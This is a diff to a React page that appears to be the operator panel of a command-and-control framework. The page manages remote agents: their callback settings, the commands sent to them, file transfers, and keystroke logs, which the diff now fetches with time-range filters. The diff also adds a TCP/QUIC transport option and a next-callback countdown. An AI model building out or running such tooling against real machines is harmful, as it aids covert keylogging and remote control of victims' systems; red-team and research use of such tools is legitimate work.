@@ -10,11 +10,15 @@ const Agent = () => {
   const [error, setError] = useState(null);
 
   const [data, setData] = useState(null);
+  const [loading, setLoading] = useState(true);
+  const initialLoadRef = useRef(true);
   const [activeTab, setActiveTab] = useState('commands');
   
   // States related to commands tab
   const [commands, setCommands] = useState([]);
   const [keylogs, setKeylogs] = useState([]);
+  const [keylogRangeDays, setKeylogRangeDays] = useState(1);
+  const [keylogTotal, setKeylogTotal] = useState(0);
   const [newCommand, setNewCommand] = useState('');
   const commandListRef = useRef(null);
   const [isAtBottom, setIsAtBottom] = useState(true);
@@ -26,6 +30,7 @@ const Agent = () => {
   const [callbackPort, setCallbackPort] = useState('');
   const [callbackFreq, setCallbackFreq] = useState('');
   const [callbackJitter, setCallbackJitter] = useState('');
+  const [transportprotocol, setTransportProtocol] = useState('')
   const [saveError, setSaveError] = useState(null);
   const [isSaving, setIsSaving] = useState(false);
 
@@ -41,6 +46,7 @@ const Agent = () => {
   const [tags, setTags] = useState([]);
   const [newKey, setNewKey] = useState('');
   const [newValue, setNewValue] = useState('');
+  const [now, setNow] = useState(Date.now());
 
   // States related to Files tab
   const [files, setFiles] = useState([]);
@@ -60,12 +66,15 @@ const Agent = () => {
       return;
     }
 
+    const wasInitialLoad = initialLoadRef.current;
     try {
+      if (wasInitialLoad) {
+        setLoading(true);
+      }
       const queryParam = getQueryParam('agt');
       const agentResponse = await axios.get(`/api/agent/${queryParam}`);
       const commandsResponse = await axios.get(`/api/commands/${queryParam}`);
-      const filesResponse = await axios.get(`/api/files/list/${queryParam}`);
-      const keylogsResponse = await axios.get(`/api/keylog/${queryParam}`);
+      const filesResponse = await axios.get(`/api/agents/files/list/${queryParam}`);
       const notesResponse = await axios.get(`/api/notes/${queryParam}`);
       const tagsResponse = await axios.get(`/api/tags/${queryParam}`);
       const tagsData = tagsResponse.data.tags;
@@ -77,8 +86,9 @@ const Agent = () => {
         setCallbackPort(responseData.serverport || '');
         setCallbackFreq(responseData.callbackfrequency || '');
         setCallbackJitter(responseData.callbackjitter || '');
+        setTransportProtocol(responseData.transportprotocol || '');
       } else {
-        setError('No data found');
+        setData(null);
       }
 
       if (commandsResponse.data.data) {
@@ -115,16 +125,10 @@ const Agent = () => {
       } else {
         setFiles([])
       }
-      if (keylogsResponse.data.data) {
-        setKeylogs(keylogsResponse.data.data);
-      } else {
-        setKeylogs([]);
+      if (activeTab === 'keys') {
+        fetchKeylogs(queryParam);
       }
-      if (notesResponse.data.data && notesResponse.data.data.length > 0) {
-        setNotes(notesResponse.data.data[0].note || '');
-      } else {
-        setNotes('');
-      }
+      setNotes(notesResponse.data?.data?.note ?? '');
       if (Array.isArray(tagsData)) {
         setTags(tagsData);
       } else {
@@ -132,6 +136,34 @@ const Agent = () => {
       }
     } catch (err) {
       setError(err.message);
+    } finally {
+      if (wasInitialLoad) {
+        setLoading(false);
+        initialLoadRef.current = false;
+      }
+    }
+  };
+
+  const fetchKeylogs = async (uuid) => {
+    try {
+      const nowIso = new Date().toISOString();
+      const params = {
+        uuid,
+        sort: 'created_at:desc',
+        limit: 200
+      };
+      if (keylogRangeDays > 0) {
+        const start = new Date(Date.now() - keylogRangeDays * 24 * 60 * 60 * 1000).toISOString();
+        params.start = start;
+        params.end = nowIso;
+      }
+      const response = await axios.get('/api/opensearch/keylogs', { params });
+      const hits = response?.data?.data || [];
+      setKeylogTotal(response?.data?.total?.value || 0);
+      setKeylogs(hits.map(hit => hit._source || {}));
+    } catch (err) {
+      setKeylogs([]);
+      setKeylogTotal(0);
     }
   };
   
@@ -176,7 +208,7 @@ const Agent = () => {
       formData.append('uuid', getQueryParam('agt'));
       formData.append('transfertype', transfertype);
   
-      await axios.post('/api/files/upload', formData, {
+      await axios.post('/api/agents/files/upload', formData, {
         headers: { 'Content-Type': 'multipart/form-data' },
       });
   
@@ -200,6 +232,23 @@ const Agent = () => {
 
     return () => clearInterval(interval);
   }, [location.search, activeTab]);
+
+  useEffect(() => {
+    initialLoadRef.current = true;
+    setLoading(true);
+  }, [location.search]);
+
+  useEffect(() => {
+    if (activeTab !== 'keys') return;
+    const queryParam = getQueryParam('agt');
+    if (!queryParam) return;
+    fetchKeylogs(queryParam);
+  }, [activeTab, keylogRangeDays, location.search]);
+
+  useEffect(() => {
+    const id = setInterval(() => setNow(Date.now()), 1000);
+    return () => clearInterval(id);
+  }, []);
 
   useEffect(() => {
     const handleScroll = () => {
@@ -259,6 +308,7 @@ const Agent = () => {
         serverport: callbackPort,
         callbackfreq: callbackFreq,
         callbackjitter: callbackJitter,
+        transportprotocol: transportprotocol,
       };
 
       await axios.post(`/api/updateagent/${queryParam}`, updateBody, {
@@ -279,9 +329,21 @@ const Agent = () => {
     return <div>Error: {error}</div>;
   }
 
+  if (loading) {
+    return <p>Loading agent data...</p>;
+  }
+
   if (!data) {
     return <p>No data available</p>;
   }
+
+  const formatCountdown = (nextCallbackUnix) => {
+    if (!nextCallbackUnix) return '—';
+    const delta = Math.floor(nextCallbackUnix - now / 1000);
+    if (Number.isNaN(delta)) return '—';
+    if (delta <= 0) return 'due';
+    return `${delta}s`;
+  };
 
   const handleKeyPress = (e) => {
     if (e.key === 'Enter') {
@@ -366,7 +428,7 @@ const Agent = () => {
         <h3>File Transfers</h3>
         <form onSubmit={(e) => { e.preventDefault(); handleFileTransferRequest(); }}>
           <div>
-            <label>Path: </label>
+            <label>Path (with file name): </label>
             <input
               type="text"
               value={fileUploadPath}
@@ -424,15 +486,47 @@ const Agent = () => {
 
   const renderKeylogsTab = () => (
     <div className="keylogs-list">
+      <div className="keylogs-filters">
+        <label htmlFor="keylogRange">Range</label>
+        <select
+          id="keylogRange"
+          value={keylogRangeDays}
+          onChange={(e) => {
+            const next = Number(e.target.value);
+            setKeylogRangeDays(next);
+            const queryParam = getQueryParam('agt');
+            if (activeTab === 'keys' && queryParam) {
+              fetchKeylogs(queryParam);
+            }
+          }}
+        >
+          <option value={1}>Last 24 hours</option>
+          <option value={7}>Last 7 days</option>
+          <option value={30}>Last 30 days</option>
+          <option value={0}>All time</option>
+        </select>
+        <span className="keylogs-meta">Total: {keylogTotal}</span>
+      </div>
       {keylogs.length === 0 ? (
         <p>No keylogs available.</p>
       ) : (
         <ul>
-          {keylogs.map((keylog) => (
-            <li key={keylog.uuid}>
-              {keylog.keys || 'No keys recorded'}
-            </li>
-          ))}
+          {keylogs.map((keylog) => {
+            const formattedTime = new Date(keylog.created_at).toLocaleString();
+
+            return (
+              <li key={keylog.keylog_id || keylog.created_at}>
+                <div className="keylog-entry">
+                  <div className="keylog-meta">
+                    <span className="keylog-time">{formattedTime}</span>
+                  </div>
+                  <div className="keylog-content">
+                    {keylog.contents || "No keylogs recorded"}
+                  </div>
+                </div>
+              </li>
+            );
+          })}
         </ul>
       )}
     </div>
@@ -482,6 +576,18 @@ const Agent = () => {
                     disabled={isSaving}
                 />
             </div>
+            <div className="form-group">
+                <label htmlFor="transportprotocol">Transport Protocol</label>
+                <select
+                    id="transportprotocol"
+                    value={transportprotocol}
+                    onChange={(e) => setTransportProtocol(e.target.value)}
+                    disabled={isSaving}
+                >
+                    <option value="TCP">TCP</option>
+                    <option value="QUIC">QUIC</option>
+                </select>
+            </div>
             <button type="button" onClick={handleSaveConfiguration} disabled={isSaving}>
                 {isSaving ? 'Saving...' : 'Save'}
             </button>
@@ -525,8 +631,8 @@ const Agent = () => {
 
   const renderTagsTab = () => {
     return (
-      <div>
-        <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
+      <div className="tags-tab">
+        <div className="tags-list">
           <table>
             <thead>
               <tr>
@@ -549,27 +655,29 @@ const Agent = () => {
           </table>
         </div>
 
-        <h3>Add / Modify Tags</h3>
-        <form onSubmit={handleAddTag}>
-          <div>
-            <label>Key: </label>
-            <input
-              type="text"
-              value={newKey}
-              onChange={(e) => setNewKey(e.target.value)}
-              required
-            />
-          </div>
-          <div>
-            <label>Value: </label>
-            <input
-              type="text"
-              value={newValue}
-              onChange={(e) => setNewValue(e.target.value)}
-            />
-          </div>
-          <button type="submit">Add Tag</button>
-        </form>
+        <div className="tags-form">
+          <h3>Add / Modify Tags</h3>
+          <form onSubmit={handleAddTag}>
+            <div>
+              <label>Key: </label>
+              <input
+                type="text"
+                value={newKey}
+                onChange={(e) => setNewKey(e.target.value)}
+                required
+              />
+            </div>
+            <div>
+              <label>Value: </label>
+              <input
+                type="text"
+                value={newValue}
+                onChange={(e) => setNewValue(e.target.value)}
+              />
+            </div>
+            <button type="submit">Add Tag</button>
+          </form>
+        </div>
       </div>
     );
   };
@@ -582,6 +690,8 @@ const Agent = () => {
             </div>
             <div className="agent-status">
                 <div>Status: {data.status}</div>
+                <div>Agent IP: {data.agentip || '—'}</div>
+                <div>Next Callback: {formatCountdown(data.nextcallback_unix)}</div>
                 <div>OS: {data.osbuild} {data.arch}</div>
                 <div>CPUs: {data.cpus} Memory: {data.memory}GB</div>
             </div>
